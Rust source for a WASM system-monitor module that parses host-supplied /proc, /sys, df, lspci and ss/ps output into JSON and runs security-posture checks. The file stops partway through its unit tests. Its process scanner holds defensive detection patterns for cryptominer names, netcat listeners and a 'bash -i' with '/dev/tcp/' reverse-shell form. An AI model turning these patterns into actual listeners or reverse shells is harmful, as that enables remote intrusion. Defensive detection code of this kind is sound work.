// machine-sys — thin, pure Rust syscalls for the machine aio app.
//
// Design: the host (Deno) owns all I/O — it reads /sys, /proc and runs
// lspci/lsusb/ip/df — and passes the raw bytes into WASM. The Rust layer is
// PURE: it parses, normalizes, and emits compact JSON. No std::process, no
// std::fs inside WASM (wasm32-unknown-unknown has neither). This keeps the
// syscall boundary cheap, cacheable, and testable from Rust tests with plain
// string fixtures.
//
// Memory protocol: every exported syscall takes (ptr, len) byte-slices and
// returns a length-prefixed (4-byte LE length + UTF-8) heap allocation the host
// reads via str_len(ptr) and frees via free_str(ptr).

#![allow(clippy::needless_return, clippy::too_many_lines)]

// (no std imports needed — pure string parsing only)

// ── host-provided imports ────────────────────────────────────────────────
mod ffi {
    use std::os::raw::c_char;
    #[link(wasm_import_module = "env")]
    extern "C" {
        #[link_name = "vmlog"]
        pub fn vmlog(ptr: *const c_char, len: usize);
    }
}

fn log_host(msg: &str) {
    unsafe { ffi::vmlog(msg.as_ptr() as *const std::os::raw::c_char, msg.len()) };
}

// ── memory helpers ────────────────────────────────────────────────────────

fn return_str(s: String) -> *mut u8 {
    let bytes = s.into_bytes();
    let len = bytes.len();
    unsafe {
        let layout = std::alloc::Layout::from_size_align_unchecked(len + 4, 4);
        let base = std::alloc::alloc(layout);
        if base.is_null() {
            std::alloc::handle_alloc_error(layout);
        }
        std::ptr::write_unaligned(base as *mut u32, len as u32);
        std::ptr::copy_nonoverlapping(bytes.as_ptr(), base.add(4), len);
        // Return pointer to the string DATA; the 4-byte LE length lives 4 bytes
        // before it (at base+0). str_len/free_str use ptr.sub(4) to find it.
        base.add(4)
    }
}

fn read_slice<'a>(ptr: *const u8, len: usize) -> &'a [u8] {
    if ptr.is_null() || len == 0 {
        return &[];
    }
    unsafe { std::slice::from_raw_parts(ptr, len) }
}

fn read_str<'a>(ptr: *const u8, len: usize) -> &'a str {
    let bytes = read_slice(ptr, len);
    std::str::from_utf8(bytes).unwrap_or("")
}

// ── escape + tiny json builder ────────────────────────────────────────────

fn esc(s: &str) -> String {
    let mut o = String::with_capacity(s.len() + 2);
    o.push('"');
    for c in s.chars() {
        match c {
            '"' => o.push_str("\\\""),
            '\\' => o.push_str("\\\\"),
            '\n' => o.push_str("\\n"),
            '\r' => o.push_str("\\r"),
            '\t' => o.push_str("\\t"),
            c if (c as u32) < 0x20 => o.push_str(&format!("\\u{:04x}", c as u32)),
            c => o.push(c),
        }
    }
    o.push('"');
    o
}

fn json_pair(key: &str, value: &str, is_literal: bool) -> String {
    let mut s = String::new();
    s.push_str(&esc(key));
    s.push(':');
    if is_literal {
        s.push_str(value);
    } else {
        s.push_str(&esc(value));
    }
    s
}

fn join(parts: &[String]) -> String {
    parts.join(",")
}

// ── CPU ──────────────────────────────────────────────────────────────────
// Inputs: cpuinfo (full /proc/cpuinfo), stat_line (first line of /proc/stat),
// hwmon (concatenated name+temp inputs; the host passes a stable textual
// representation). Returns compact JSON.

#[no_mangle]
pub extern "C" fn sys_cpu(cpuinfo: *const u8, cpuinfo_len: usize, stat_full: *const u8, stat_len: usize, hwmon: *const u8, hwmon_len: usize) -> *mut u8 {
    let _ = log_host;
    let cpuinfo = read_str(cpuinfo, cpuinfo_len);
    let stat_full = read_str(stat_full, stat_len);
    let hwmon = read_str(hwmon, hwmon_len);

    let model = cpuinfo.lines().find(|l| l.starts_with("model name"))
        .and_then(|l| l.split(':').nth(1).map(|s| s.trim().to_string()))
        .unwrap_or_default();
    // line-start only: a model name may contain "processor" ("Common KVM processor")
    let cores = cpuinfo.lines().filter(|l| l.starts_with("processor")).count();

    // CPU temps from hwmon block; host passes lines like "name\ntemp1_input\n..."
    let mut cpu_temp: f64 = 0.0;
    let mut lines = hwmon.lines();
    while let Some(name) = lines.next() {
        if !(name.contains("coretemp") || name.contains("k10temp") || name.contains("cpu_thermal") || name.contains("zenpower") || name == "core") {
            continue;
        }
        if let Some(t) = lines.next() {
            if let Ok(v) = t.trim().parse::<f64>() {
                cpu_temp = v / 1000.0;
                break;
            }
        }
    }

    // Per-core stat lines: "cpu0 ...", "cpu1 ...". Return the raw lines so the
    // host can compute per-core utilization deltas across samples.
    let core_stats: Vec<String> = stat_full.lines()
        .filter(|l| l.starts_with("cpu") && l.chars().nth(3).map_or(false, |c| c.is_ascii_digit()))
        .map(|l| l.to_string())
        .collect();
    let aggregate = stat_full.lines().next().unwrap_or("").to_string();

    let mut m: Vec<(String, String, bool)> = Vec::new();
    m.push(("model".into(), model, false));
    m.push(("cores".into(), cores.to_string(), true));
    m.push(("stat".into(), aggregate, false));
    m.push(("core_stats".into(), format!("[{}]", core_stats.iter().map(|s| esc(s)).collect::<Vec<_>>().join(",")), true));
    m.push(("temp_c".into(), format!("{:.1}", cpu_temp), true));
    // util_pct + cores_util: the host computes from deltas of two samples.
    // Default 0 here; the cell stamps real values after parsing.
    m.push(("util_pct".into(), "0".to_string(), true));
    m.push(("cores_util".into(), "[]".to_string(), true));
    return_str(json_obj(&m))
}

// ── Memory ───────────────────────────────────────────────────────────────
// Input: /proc/meminfo contents.

#[no_mangle]
pub extern "C" fn sys_mem(meminfo: *const u8, len: usize) -> *mut u8 {
    let info = read_str(meminfo, len);
    let mut total_kb: u64 = 0;
    let mut avail_kb: u64 = 0;
    for line in info.lines() {
        if line.starts_with("MemTotal:") {
            total_kb = line.split_whitespace().nth(1).and_then(|s| s.parse::<u64>().ok()).unwrap_or(0);
        } else if line.starts_with("MemAvailable:") {
            avail_kb = line.split_whitespace().nth(1).and_then(|s| s.parse::<u64>().ok()).unwrap_or(0);
        }
    }
    let used_kb = total_kb.saturating_sub(avail_kb);
    let used_pct = if total_kb > 0 { (used_kb as f64 / total_kb as f64) * 100.0 } else { 0.0 };
    let m: Vec<(String, String, bool)> = vec![
        ("total_kb".into(), total_kb.to_string(), true),
        ("available_kb".into(), avail_kb.to_string(), true),
        ("used_kb".into(), used_kb.to_string(), true),
        ("used_pct".into(), format!("{:.1}", used_pct), true),
    ];
    return_str(json_obj(&m))
}

// ── Motherboard / BIOS ────────────────────────────────────────────────────
// Inputs: the four DMI files + hwmon block (name\ntemp pairs).

#[no_mangle]
pub extern "C" fn sys_board(
    board_name: *const u8, bn_len: usize,
    board_vendor: *const u8, bv_len: usize,
    board_version: *const u8, bver_len: usize,
    bios_vendor: *const u8, bven_len: usize,
    bios_version: *const u8, bbver_len: usize,
    bios_date: *const u8, bd_len: usize,
    product_name: *const u8, pn_len: usize,
    hwmon: *const u8, hw_len: usize,
) -> *mut u8 {
    let s = |p: *const u8, l: usize| read_str(p, l).to_string();
    let hwmon = read_str(hwmon, hw_len);

    // Devices are blank-line separated "name\ntemp…" blocks. Super-I/O chips
    // (nct*/it87*/asus*) are the real board sensors; acpi/board are fallbacks.
    let rank = |n: &str| if n.starts_with("nct") || n.starts_with("it87") || n.starts_with("asus") { 0 }
        else if n.contains("acpi") || n.contains("board") { 1 } else { 2 };
    let best = hwmon.split("\n\n")
        .filter_map(|b| { let mut l = b.lines().filter(|l| !l.is_empty()); l.next().map(|n| (rank(n), l)) })
        .filter(|(r, _)| *r < 2)
        .min_by_key(|(r, _)| *r);
    // unconnected super-I/O inputs read 0 or a negative sentinel (-60) — drop
    let temps: Vec<String> = best.map(|(_, l)| l.filter_map(|t| t.trim().parse::<f64>().ok())
        .map(|v| v / 1000.0).filter(|c| *c > 0.0 && *c < 150.0)
        .map(|c| format!("{:.1}", c)).collect()).unwrap_or_default();

    let m: Vec<(String, String, bool)> = vec![
        ("board_name".into(), s(board_name, bn_len), false),
        ("board_vendor".into(), s(board_vendor, bv_len), false),
        ("board_version".into(), s(board_version, bver_len), false),
        ("bios_vendor".into(), s(bios_vendor, bven_len), false),
        ("bios_version".into(), s(bios_version, bbver_len), false),
        ("bios_date".into(), s(bios_date, bd_len), false),
        ("product_name".into(), s(product_name, pn_len), false),
        ("temps_c".into(), format!("[{}]", temps.join(",")), true),
    ];
    return_str(json_obj(&m))
}

// ── GPU ──────────────────────────────────────────────────────────────────
// Input: nvidia-smi csv output (or empty). The host already tried AMD/Intel
// hwmon and may pass a combined block; we parse nvidia-smi first.

#[no_mangle]
pub extern "C" fn sys_gpu(nvidia_smi: *const u8, len: usize, hwmon: *const u8, hw_len: usize) -> *mut u8 {
    let nvidia = read_str(nvidia_smi, len);
    let hwmon = read_str(hwmon, hw_len);
    let mut gpus: Vec<String> = Vec::new();
    for line in nvidia.lines() {
        let line = line.trim();
        if line.is_empty() { continue; }
        let parts: Vec<&str> = line.split(',').map(|s| s.trim()).collect();
        if parts.len() >= 5 {
            // "[N/A]"/"[Not Supported]" fields would be invalid JSON — default 0
            let n = |i: usize| parts[i].parse::<f64>().unwrap_or(0.0);
            gpus.push(format!(
                r#"{{"name":{},"temp_c":{},"util_pct":{},"mem_total_mb":{},"mem_used_mb":{}}}"#,
                esc(parts[0]), n(1), n(2), n(3), n(4)
            ));
        }
    }
    // hwmon block for AMD/Intel: "name\nfreq\nutil\ntemp\n" per device
    let mut lines = hwmon.lines();
    while let Some(name) = lines.next() {
        if name.is_empty() { continue; }
        let temp = lines.next().and_then(|t| t.trim().parse::<f64>().ok()).map(|v| v/1000.0).unwrap_or(0.0);
        let util = lines.next().and_then(|u| u.trim().parse::<i64>().ok()).unwrap_or(0);
        lines.next(); // skip freq placeholder
        if !name.is_empty() {
            gpus.push(format!(
                r#"{{"name":{},"temp_c":{:.1},"util_pct":{},"mem_total_mb":0,"mem_used_mb":0}}"#,
                esc(name), temp, util
            ));
        }
    }
    return_str(format!(r#"{{"gpus":[{}]}}"#, join(&gpus)))
}

// ── Disk ─────────────────────────────────────────────────────────────────
// Input: `df -P -B1` output. We filter to real filesystems and emit per-mount.

// Pseudo-filesystems (RAM-backed, kernel-backed) — not storage the user owns.
const PSEUDO_DEVS: &[&str] = &[
    "tmpfs", "devtmpfs", "ramfs", "efivarfs", "overlay", "none", "udev", "devfs", "map",
    "cgroup", "cgroup2", "squashfs",
];

// Read-only image mounts that are 100% full BY DESIGN: AppImage unpacks itself
// to /tmp/.mount_<name><rand> via squashfuse, snaps mount squashfs under /snap.
// Reporting them as "out of disk space" is a false alarm — skip them entirely.
fn is_image_mount(dev: &str, mp: &str) -> bool {
    dev.to_ascii_lowercase().ends_with(".appimage")
        || mp.starts_with("/tmp/.mount_")
        || mp.contains("/.mount_")
        || mp == "/snap"
        || mp.starts_with("/snap/")
        || mp.starts_with("/var/lib/snapd/snap")
}

// A mount is reportable when it is real storage with a real capacity.
// NB: matched on the device name, not the path — /run/media/<user>/<label>
// (removable drives) is real storage and must survive, while /run itself
// (device `tmpfs`) must not.
fn is_reportable(dev: &str, mp: &str, total: u64) -> bool {
    total > 0
        && !PSEUDO_DEVS.contains(&dev)
        && !dev.starts_with("fuse")
        && !is_image_mount(dev, mp)
}

#[no_mangle]
pub extern "C" fn sys_disk(df: *const u8, len: usize) -> *mut u8 {
    let df = read_str(df, len);
    let mut mounts: Vec<String> = Vec::new();
    let mut root_total: u64 = 0;
    let mut root_used: u64 = 0;
    let mut root_pct: f64 = 0.0;
    let mut root_avail: u64 = 0;
    for line in df.lines() {
        let cols: Vec<&str> = line.split_whitespace().collect();
        if cols.len() < 6 { continue; }
        // skip header
        if cols[0] == "Filesystem" { continue; }
        let mp = &cols[5..].join(" "); // mount points may contain spaces
        let total: u64 = cols[1].parse().unwrap_or(0);
        let used: u64 = cols[2].parse().unwrap_or(0);
        let avail: u64 = cols[3].parse().unwrap_or(0);
        let pct: f64 = cols[4].trim_end_matches('%').parse::<f64>().unwrap_or(0.0);
        if !is_reportable(cols[0], mp, total) { continue; }
        mounts.push(format!(
            r#"{{"mount":{},"total_b":{},"used_b":{},"used_pct":{:.1}}}"#,
            esc(mp), total, used, pct
        ));
        // Windows has no "/" — its system drive (C:) is the root
        if mp == "/" || mp.eq_ignore_ascii_case("C:") {
            root_total = total;
            root_used = used;
            root_pct = pct;
            root_avail = avail;
        }
    }
    return_str(format!(
        r#"{{"root_total_b":{},"root_used_b":{},"root_used_pct":{:.1},"root_avail_b":{},"mounts":[{}]}}"#,
        root_total, root_used, root_pct, root_avail, join(&mounts)
    ))
}

// ── Memory DIMMs ──────────────────────────────────────────────────────────
// Input: `dmidecode -t memory` output. Parses Memory Device (type 17) entries
// into {locator, size, speed, type}. The host passes the raw text; if dmidecode
// isn't available or needs root, the host passes "" and we return an empty array.

#[no_mangle]
pub extern "C" fn sys_dimms(raw: *const u8, len: usize) -> *mut u8 {
    let out = read_str(raw, len);
    let mut dimms: Vec<String> = Vec::new();
    // dmidecode blocks are separated by blank lines; each "Memory Device" block
    // has fields like "Size: 32 GB", "Speed: 5600 MT/s", "Locator: DIMM 0", "Type: DDR5".
    let mut current: std::collections::HashMap<&str, String> = std::collections::HashMap::new();
    for line in out.lines() {
        let line = line.trim();
        if line.is_empty() {
            // end of block — if it had a Size, emit it
            if let Some(size) = current.get("Size") {
                if !size.contains("No Module") && !size.contains("Unknown") {
                    let locator = current.get("Locator").cloned().unwrap_or_default();
                    let speed = current.get("Speed").cloned().unwrap_or_default();
                    let dtype = current.get("Type").cloned().unwrap_or_default();
                    dimms.push(format!(
                        r#"{{"locator":{},"size":{},"speed":{},"type":{}}}"#,
                        esc(&locator), esc(size), esc(&speed), esc(&dtype)
                    ));
                }
            }
            current.clear();
            continue;
        }
        // "Memory Device" header line — start of a new block
        if line == "Memory Device" {
            current.clear();
            continue;
        }
        if let Some(idx) = line.find(':') {
            let key = line[..idx].trim();
            let val = line[idx + 1..].trim();
            current.insert(key, val.to_string());
        }
    }
    // flush last block
    if let Some(size) = current.get("Size") {
        if !size.contains("No Module") && !size.contains("Unknown") {
            let locator = current.get("Locator").cloned().unwrap_or_default();
            let speed = current.get("Speed").cloned().unwrap_or_default();
            let dtype = current.get("Type").cloned().unwrap_or_default();
            dimms.push(format!(
                r#"{{"locator":{},"size":{},"speed":{},"type":{}}}"#,
                esc(&locator), esc(size), esc(&speed), esc(&dtype)
            ));
        }
    }
    return_str(format!(r#"[{}]"#, join(&dimms)))
}

// ── lspci / lsusb ─────────────────────────────────────────────────────────
// Inputs: raw `lspci -nnmm` and `lsusb` output.

#[no_mangle]
pub extern "C" fn sys_lspci(raw: *const u8, len: usize) -> *mut u8 {
    let out = read_str(raw, len);
    // `lspci -nnmm` is quote-delimited, NOT space-delimited:
    //   00:00.0 "Host bridge [0600]" "Advanced Micro Devices [AMD] [1022]" "Device [14d8]" -p00 ...
    // Splitting on spaces mangles the fields, so pull the quoted segments in
    // order: [0]=class, [1]=vendor, [2]=device. Everything after (rev/progif/
    // subsystem) is ignored.
    let lines: Vec<String> = out
        .lines()
        .filter(|l| !l.trim().is_empty())
        .map(|l| {
            let mut fields: Vec<String> = Vec::new();
            let mut in_q = false;
            let mut cur = String::new();
            for ch in l.chars() {
                if ch == '"' {
                    if in_q {
                        fields.push(cur.clone());
                        cur.clear();
                    }
                    in_q = !in_q;
                } else if in_q {
                    cur.push(ch);
                }
            }
            let class = fields.first().map(|s| s.as_str()).unwrap_or("");
            let vendor = fields.get(1).map(|s| s.as_str()).unwrap_or("");
            let name = fields.get(2).map(|s| s.as_str()).unwrap_or("");
            format!(
                r#"{{"class":{},"vendor":{},"name":{}}}"#,
                esc(class),
                esc(vendor),
                esc(name)
            )
        })
        .collect();
    return_str(format!(r#"[{}]"#, join(&lines)))
}

#[no_mangle]
pub extern "C" fn sys_lsusb(raw: *const u8, len: usize) -> *mut u8 {
    let out = read_str(raw, len);
    let lines: Vec<String> = out.lines().map(|l| {
        let l = l.trim();
        let parts: Vec<&str> = l.splitn(7, ' ').collect();
        let bus = parts.get(1).copied().unwrap_or("");
        let dev = parts.get(3).map(|s| s.trim_end_matches(':')).unwrap_or("");
        let id = parts.get(5).copied().unwrap_or("");
        let name = parts.get(6).copied().unwrap_or("");
        format!(r#"{{"bus":{},"dev":{},"id":{},"name":{}}}"#, esc(bus), esc(dev), esc(id), esc(name))
    }).collect();
    return_str(format!(r#"[{}]"#, join(&lines)))
}

// ── Network / VPN / Firewall ──────────────────────────────────────────────
// Inputs: `ip -j -br addr` (json), `ip -j -br link` (json), default route text,
// firewall state string ("<backend>:active"|"<backend>:inactive"|"none").

#[no_mangle]
pub extern "C" fn sys_net(
    addr_json: *const u8, aj_len: usize,
    link_json: *const u8, lj_len: usize,
    route: *const u8, r_len: usize,
    fw_state: *const u8, fw_len: usize,
    speed_info: *const u8, si_len: usize,
) -> *mut u8 {
    let addrs = read_str(addr_json, aj_len);
    let links = read_str(link_json, lj_len);
    let route = read_str(route, r_len);
    let fw_state = read_str(fw_state, fw_len);
    let speed_info = read_str(speed_info, si_len);

    // VPN detection per link object (`ip -j -br link` has no nested objects):
    // tun/wg/ppp/nordlynx/ipsec/openvpn names OR the POINTOPOINT flag (NordVPN's
    // nordlynx), and only while operstate is UP/UNKNOWN (tunnels report
    // UNKNOWN). No "tap" — QEMU/libvirt tap NICs are not VPNs.
    let vpn_names = ["\"ifname\":\"tun", "\"ifname\":\"wg", "\"ifname\":\"ppp", "\"ifname\":\"nordlynx", "\"ifname\":\"ipsec", "\"ifname\":\"openvpn"];
    let vpn = links.split('}').any(|o| {
        (vpn_names.iter().any(|p| o.contains(p)) || o.contains("\"POINTOPOINT\""))
            && (o.contains("\"operstate\":\"UP\"") || o.contains("\"operstate\":\"UNKNOWN\""))
    });
    let (fw_backend, fw_active) = match fw_state.split_once(':') {
        Some((b, st)) => (b, st == "active"),
        None => ("none", false),
    };

    // speed_info is a JSON object the host builds: {"link_max_mbps":N,"rx_mbps":N,"tx_mbps":N}
    // If empty, emit zeros.
    let speed = if speed_info.is_empty() { r#"{"link_max_mbps":0,"rx_mbps":0,"tx_mbps":0}"#.to_string() } else { speed_info.to_string() };

    return_str(format!(
        r#"{{"addrs":{},"links":{},"vpn":{},"firewall":{{"backend":{},"active":{}}},"default_route":{},"speed":{}}}"#,
        if addrs.is_empty() { "[]".to_string() } else { addrs.to_string() },
        if links.is_empty() { "[]".to_string() } else { links.to_string() },
        vpn,
        esc(fw_backend), fw_active,
        esc(route),
        speed
    ))
}

// ── Security posture ──────────────────────────────────────────────────────
// Inputs (all raw text, host does the I/O):
//   ss     — `ss -tulnpH` output (listening sockets; process names best-effort)
//   ps     — `ps -eo pid=,user=,args=` output
//   sysctl — "key value" lines the host reads from /proc/sys (missing = skip)
//   sshd   — raw /etc/ssh/sshd_config ("" = no sshd installed → skip ssh checks)
//   facts  — "key value" lines: secureboot enabled|disabled|unknown,
//            luks 1|0|-1, updates N|-1  (-1/unknown = skip the check),
//            crypt <scheme name>, av on|off (Windows real-time antivirus)
// Output: {"ports":[…],"procs":[…],"checks":[…]}. Unknown never false-alarms:
// a check whose input is missing is OMITTED, not reported as failing.

/// Local addr → (ip, port). Handles "0.0.0.0:22", "[::]:22", "127.0.0.1:631", "*:80".
fn split_addr_port(s: &str) -> (String, u16) {
    let (ip, port) = match s.rfind(':') {
        Some(i) => (&s[..i], &s[i + 1..]),
        None => (s, ""),
    };
    (ip.trim_matches(|c| c == '[' || c == ']').to_string(), port.parse().unwrap_or(0))
}

fn is_loopback(ip: &str) -> bool {
    ip.starts_with("127.") || ip == "::1" || ip == "localhost"
}

fn kv_lookup<'a>(block: &'a str, key: &str) -> Option<&'a str> {
    block.lines().find_map(|l| {
        let mut it = l.split_whitespace();
        if it.next() == Some(key) { Some(it.next().unwrap_or("")) } else { None }
    })
}

/// Effective global value of an sshd_config directive — sshd takes the FIRST
/// value; `Match` starts conditional blocks, so stop there. The host inlines
/// `Include`d files at their position before calling.
fn sshd_directive<'a>(cfg: &'a str, key: &str) -> Option<&'a str> {
    for line in cfg.lines() {
        let mut it = line.trim().split_whitespace();
        match it.next() {
            Some(k) if k.eq_ignore_ascii_case("Match") => return None,
            Some(k) if k.eq_ignore_ascii_case(key) => return it.next(),
            _ => {}
        }
    }
    None
}

#[no_mangle]
pub extern "C" fn sys_sec(
    ss: *const u8, ss_len: usize,
    ps: *const u8, ps_len: usize,
    sysctl: *const u8, sy_len: usize,
    sshd: *const u8, sh_len: usize,
    facts: *const u8, fa_len: usize,
) -> *mut u8 {
    let ss = read_str(ss, ss_len);
    let ps = read_str(ps, ps_len);
    let sysctl = read_str(sysctl, sy_len);
    let sshd = read_str(sshd, sh_len);
    let facts = read_str(facts, fa_len);

    // ── listening ports ──
    // ss -tulnpH: "tcp LISTEN 0 4096 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1,fd=3))"
    // udp rows say UNCONN. Dedup by proto+ip+port (v4/v6 dual rows collapse).
    let mut ports: Vec<String> = Vec::new();
    let mut seen: Vec<(String, String, u16)> = Vec::new();
    for line in ss.lines() {
        let cols: Vec<&str> = line.split_whitespace().collect();
        if cols.len() < 5 {
            continue;
        }
        let proto = cols[0];
        if proto != "tcp" && proto != "udp" {
            continue;
        }
        let (ip, port) = split_addr_port(cols[4]);
        if port == 0 {
            continue;
        }
        let process = line
            .split("users:((\"")
            .nth(1)
            .and_then(|r| r.split('"').next())
            .unwrap_or("");
        let key = (proto.to_string(), ip.clone(), port);
        if seen.contains(&key) {
            continue;
        }
        seen.push(key);
        let exposed = !is_loopback(&ip);
        ports.push(format!(
            r#"{{"proto":{},"addr":{},"port":{},"process":{},"exposed":{}}}"#,
            esc(proto), esc(&ip), port, esc(process), exposed
        ));
    }

    // ── suspicious processes ──
    // ps -eo pid=,user=,args=. Flag: binaries executing from world-writable
    // dirs, known cryptominers, listener netcats, classic reverse-shell forms.
    const MINERS: &[&str] = &["xmrig", "minerd", "kdevtmpfsi", "kinsing", "xmr-stak"];
    let mut procs: Vec<String> = Vec::new();
    for line in ps.lines() {
        if procs.len() >= 12 {
            break; // cap — the UI shows a short list, the count says the rest
        }
        let t = line.trim();
        let mut it = t.splitn(3, char::is_whitespace);
        let pid: u32 = it.next().unwrap_or("").parse().unwrap_or(0);
        let user = it.next().unwrap_or("");
        let args = it.next().unwrap_or("").trim();
        if pid == 0 || args.is_empty() {
            continue;
        }
        let exe = args.split_whitespace().next().unwrap_or("");
        let base = exe.rsplit('/').next().unwrap_or("");
        // /tmp/.mount_* = AppImage squashfuse mounts (incl. this app) — benign
        let reason = if (exe.starts_with("/tmp/") && !exe.starts_with("/tmp/.mount_"))
            || exe.starts_with("/dev/shm/") || exe.starts_with("/var/tmp/")
        {
            "executing from a world-writable dir"
        } else if MINERS.contains(&base) {
            "known cryptominer name"
        } else if ["nc", "ncat", "netcat", "socat"].contains(&base)
            && args.split_whitespace().any(|a| a == "-l" || a.starts_with("-l"))
        {
            "netcat listener"
        } else if args.contains("bash -i") && args.contains("/dev/tcp/") {
            "reverse-shell pattern"
        } else {
            continue;
        };
        procs.push(format!(
            r#"{{"pid":{},"user":{},"cmd":{},"reason":{}}}"#,
            pid, esc(user), esc(args), esc(reason)
        ));
    }

    // ── hardening checks ──
    // (id, label, value, ok, hint) — emitted only when the input is present.
    let mut checks: Vec<String> = Vec::new();
    let mut push_check = |id: &str, label: &str, value: &str, ok: bool, hint: &str| {
        checks.push(format!(
            r#"{{"id":{},"label":{},"value":{},"ok":{},"hint":{}}}"#,
            esc(id), esc(label), esc(value), ok, esc(hint)
        ));
    };

    if let Some(v) = kv_lookup(sysctl, "randomize_va_space") {
        let (val, ok) = match v { "2" => ("full", true), "1" => ("partial", false), _ => ("off", false) };
        push_check("aslr", "ASLR", val, ok, "kernel.randomize_va_space=2 randomizes all mappings");
    }
    if let Some(v) = kv_lookup(sysctl, "ptrace_scope") {
        let ok = v.parse::<i32>().unwrap_or(0) >= 1;
        push_check("ptrace", "ptrace scope", v, ok, "yama.ptrace_scope≥1 stops cross-process memory reads");
    }
    if let Some(v) = kv_lookup(sysctl, "kptr_restrict") {
        let ok = v.parse::<i32>().unwrap_or(0) >= 1;
        push_check("kptr", "kptr restrict", v, ok, "kernel.kptr_restrict≥1 hides kernel pointers from exploits");
    }
    if let Some(v) = kv_lookup(sysctl, "dmesg_restrict") {
        let ok = v == "1";
        push_check("dmesg", "dmesg restrict", v, ok, "kernel.dmesg_restrict=1 hides kernel log from users");
    }
    if let Some(v) = kv_lookup(sysctl, "ip_forward") {
        let ok = v == "0";
        push_check("ipfwd", "IP forwarding", if ok { "off" } else { "on" }, ok,
            "net.ipv4.ip_forward=0 unless this box routes/hosts VMs");
    }
    if let Some(v) = kv_lookup(sysctl, "unprivileged_bpf_disabled") {
        let ok = v.parse::<i32>().unwrap_or(0) >= 1;
        push_check("bpf", "unpriv BPF", if ok { "blocked" } else { "allowed" }, ok,
            "kernel.unprivileged_bpf_disabled=1 closes a common LPE surface");
    }
    if !sshd.is_empty() {
        // OpenSSH defaults: PermitRootLogin prohibit-password, PasswordAuthentication yes
        let root = sshd_directive(sshd, "PermitRootLogin").unwrap_or("prohibit-password");
        let root_ok = root == "no" || root == "prohibit-password" || root == "without-password";
        push_check("ssh_root", "SSH root login", root, root_ok,
            "PermitRootLogin no — root is the #1 brute-force target");
        let pass = sshd_directive(sshd, "PasswordAuthentication").unwrap_or("yes");
        let pass_ok = pass.eq_ignore_ascii_case("no");
        push_check("ssh_pass", "SSH password auth", pass, pass_ok,
            "PasswordAuthentication no — keys only kills password brute-force");
    }
    match kv_lookup(facts, "secureboot") {
        Some("enabled") => push_check("secboot", "Secure Boot", "enabled", true,
            "blocks unsigned bootloaders/kernels (bootkits)"),
        Some("disabled") => push_check("secboot", "Secure Boot", "disabled", false,
            "enable in UEFI — blocks unsigned bootloaders/kernels"),
        _ => {} // unknown → skip, never false-alarm
    }
    // "crypt" names the scheme (FileVault/BitLocker); Linux omits it → LUKS
    let crypt = kv_lookup(facts, "crypt").unwrap_or("LUKS");
    match kv_lookup(facts, "luks") {
        Some("1") => push_check("luks", "Disk encryption", crypt, true,
            "encrypted block device present"),
        Some("0") => push_check("luks", "Disk encryption", "none", false,
            "no encrypted volumes — a stolen disk is readable"),
        _ => {}
    }
    match kv_lookup(facts, "av") {
        Some("on") => push_check("av", "Real-time antivirus", "on", true,
            "scans files as they are opened"),
        Some("off") => push_check("av", "Real-time antivirus", "off", false,
            "turn on real-time protection in Windows Security"),
        _ => {}
    }
    if let Some(n) = kv_lookup(facts, "updates").and_then(|v| v.parse::<i64>().ok()) {
        if n >= 0 {
            push_check("updates", "Pending updates", &n.to_string(), n == 0,
                "unpatched packages are the cheapest attack vector");
        }
    }

    return_str(format!(
        r#"{{"ports":[{}],"procs":[{}],"checks":[{}]}}"#,
        join(&ports), join(&procs), join(&checks)
    ))
}

// ── json obj builder ──────────────────────────────────────────────────────

fn json_obj(fields: &[(String, String, bool)]) -> String {
    let parts: Vec<String> = fields.iter().map(|(k, v, lit)| json_pair(k, v, *lit)).collect();
    format!("{{{}}}", join(&parts))
}

// ── memory management exports ─────────────────────────────────────────────

// Host calls alloc(len) to get a WASM-memory pointer, writes input bytes there
// (via the shared memory buffer), then passes that pointer to a sys_* fn.
// Outputs from sys_* are length-prefixed; host reads via str_len + the memory
// buffer, then frees with free_str.
#[no_mangle]
pub extern "C" fn alloc(len: usize) -> *mut u8 {
    // zero-size Layout is UB for alloc — hand out a dangling, never-read ptr
    if len == 0 { return std::ptr::NonNull::<u32>::dangling().as_ptr() as *mut u8; }
    unsafe {
        let layout = std::alloc::Layout::from_size_align_unchecked(len, 4);
        let ptr = std::alloc::alloc(layout);
        if ptr.is_null() {
            std::alloc::handle_alloc_error(layout);
        }
        ptr
    }
}

#[no_mangle]
pub extern "C" fn dealloc(ptr: *mut u8, len: usize) {
    if ptr.is_null() || len == 0 { return; }
    unsafe {
        let layout = std::alloc::Layout::from_size_align_unchecked(len, 4);
        std::alloc::dealloc(ptr, layout);
    }
}

#[no_mangle]
pub extern "C" fn str_len(ptr: *mut u8) -> usize {
    if ptr.is_null() { return 0; }
    unsafe { std::ptr::read_unaligned(ptr.sub(4) as *const u32) as usize }
}

#[no_mangle]
pub extern "C" fn free_str(ptr: *mut u8) {
    if ptr.is_null() { return; }
    unsafe {
        let len = std::ptr::read_unaligned(ptr.sub(4) as *const u32) as usize;
        let layout = std::alloc::Layout::from_size_align_unchecked(len + 4, 4);
        // ptr points at the data (base+4); dealloc needs the allocation base.
        std::alloc::dealloc(ptr.sub(4), layout);
    }
}

// ── unit tests (run with `cargo test` from rust/) ─────────────────────────
// Pure functions over string fixtures — prove the parsers work without any
// host or I/O. This is the "flawless future testability" the universal kata asks for.

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_meminfo() {
        let mem = "MemTotal:       16384000 kB\nMemFree:          8000000 kB\nMemAvailable:    9000000 kB\n";
        let out_ptr = sys_mem(mem.as_ptr(), mem.len());
        let len = str_len(out_ptr);
        let s = unsafe { std::str::from_utf8_unchecked(std::slice::from_raw_parts(out_ptr, len)) };
        assert!(s.contains(r#""total_kb":16384000"#), "got: {s}");
        assert!(s.contains(r#""used_kb":7384000"#), "got: {s}");
        free_str(out_ptr);
    }

    fn out(ptr: *mut u8) -> String {
        let len = str_len(ptr);
        let s = unsafe { std::str::from_utf8_unchecked(std::slice::from_raw_parts(ptr, len)).to_string() };
        free_str(ptr);
        s
    }

    #[test]
    fn parses_cpu_model_cores_and_temp() {
        let cpuinfo = concat!(
            "processor       : 0\n",
            "vendor_id       : AuthenticAMD\n",
            "model name      : AMD Ryzen 9 9950X\n",
            "cpu MHz         : 4300.000\n",
            "processor       : 1\n",
            "vendor_id       : AuthenticAMD\n",
            "model name      : AMD Ryzen 9 9950X\n",
        );
        let stat = concat!(
            "cpu  123 45 678 9000 12 0 3 0 0 0\n",
            "cpu0 60 20 300 4000 6 0 1 0 0 0\n",
            "cpu1 63 25 378 5000 6 0 2 0 0 0\n",
            "intr 0\n",
        );
        // coretemp device: name line then temp in millidegrees
